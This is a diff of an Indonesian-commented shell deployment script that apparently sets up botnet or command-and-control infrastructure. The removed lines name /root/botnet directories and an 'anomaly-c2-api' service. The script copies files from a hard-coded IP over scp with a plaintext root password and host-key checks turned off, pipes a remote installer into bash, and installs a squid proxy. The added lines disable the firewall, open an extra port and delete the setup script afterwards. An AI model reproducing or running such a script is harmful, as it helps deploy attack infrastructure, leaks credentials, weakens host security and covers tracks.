@@ -1,15 +1,10 @@
 DEBIAN_FRONTEND=noninteractive apt install -y sshpass build-essential squid
 rm -rf /mnt/.trash
-rm -rf /root/botnet
-rm -rf /www/botnet
 mkdir /mnt/.trash
 cd /mnt/.trash
 
 # Memindahkan file dengan scp
 sshpass -p 'lexcz1VPS' scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -r root@167.71.196.235:/var/file/* ./
-
-systemctl stop anomaly-c2-api || echo 'anomaly-c2-api tidak ditemukan'
-systemctl disable anomaly-c2-api || echo 'anomaly-c2-api tidak terdaftar'
 
 # Menginstal NVM dan Node.js
 curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash
@@ -26,6 +21,7 @@ pm2 save
 pm2 restart all
 
 # Mengatur firewall
+ufw disable
 ufw reload
 
 # Menjalankan skrip perbaikan
@@ -37,11 +33,13 @@ chmod 777 *
 
 # Memulai proses di screen
 cd ../..
-screen -dm node ./lib/cache/scrape.js
+node ./lib/cache/scrape.js
+rm -rf /root/s.sh
 
 # Mengatur firewall untuk port yang diperlukan
 ufw allow 4343
 ufw allow 1201
+ufw allow 812
 ufw allow 22
 ufw allow 443
 ufw allow 80
